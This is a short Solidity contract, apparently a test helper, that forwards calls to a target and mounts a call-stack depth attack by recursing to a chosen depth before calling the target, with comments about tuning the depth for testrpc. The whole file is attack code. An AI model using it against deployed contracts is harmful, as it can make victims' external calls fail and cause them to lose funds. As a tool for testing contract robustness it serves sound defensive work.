contract UserContract {
    address public target;
    bool public forwarding = false;

    function init(address _target) {
        target = _target;
    }

    bytes public attackData;
    function callStackDepthAttack(uint16 _depthLeft, bytes _msgData) returns(bool) {
        attackData = _msgData;
        // Might be unstable due to: https://github.com/ethereumjs/testrpc/issues/115
        // In perfect EVM here should be 1024
        return _callStackDepthAttack(84, _depthLeft); // 83 for testRpc
    }

    function _callStackDepthAttack(uint16 _depth, uint16 _depthLeft) returns(bool) {
        if (_depth == _depthLeft) {
            return target.call.value(msg.value)(attackData);
        }
        return this._callStackDepthAttack.value(msg.value)(_depth - 1, _depthLeft);
    }

    function () {
        if (forwarding) {
          return;
        }
        forwarding = true;
        target.call.value(msg.value)(msg.data);
        forwarding = false;
    }
}